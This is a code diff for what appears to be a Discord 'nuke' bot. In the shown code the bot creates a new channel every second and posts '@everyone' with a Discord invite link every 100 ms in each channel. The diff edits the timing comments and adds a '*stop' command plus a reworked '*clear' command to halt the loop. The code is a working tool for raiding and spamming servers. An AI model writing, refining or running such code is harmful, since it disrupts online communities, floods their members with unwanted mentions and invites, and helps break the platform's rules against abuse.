@@ -53,7 +53,7 @@ client.on('messageCreate', async (message) => {
         // Spam messages in the new channel
         setInterval(() => {
           channel.send('@everyone https://discord.gg/6Vtg4WpPHY');
-        }, 100); // Faster interval for spam (500 ms = 0.5 second)
+        }, 100); // Faster interval for spam (100 ms)
       };
 
       // Create the initial channel
@@ -62,18 +62,34 @@ client.on('messageCreate', async (message) => {
       // Infinite loop to continually create new channels and start spamming
       nukeInterval = setInterval(async () => {
         await createAndSpamChannel();
-      }, 1000); // Faster interval for creating new channels (5000 ms = 5 seconds)
+      }, 1000); // Faster interval for creating new channels (1000 ms)
 
     } catch (error) {
       console.error('Error during nuke operation:', error);
     }
   }
 
-  if (message.content === '*clear') {
+  if (message.content === '*stop') {
     try {
       // Stop the nuke process
       if (nukeInterval) {
         clearInterval(nukeInterval);
+        nukeInterval = null; // Clear the interval reference
+        message.channel.send('Nuke process stopped.');
+      } else {
+        message.channel.send('No nuke process is currently running.');
+      }
+    } catch (error) {
+      console.error('Error during stop operation:', error);
+    }
+  }
+
+  if (message.content === '*clear') {
+    try {
+      // Optionally, stop the nuke process if it is running
+      if (nukeInterval) {
+        clearInterval(nukeInterval);
+        nukeInterval = null; // Clear the interval reference
         message.channel.send('Nuke process stopped.');
       }
 
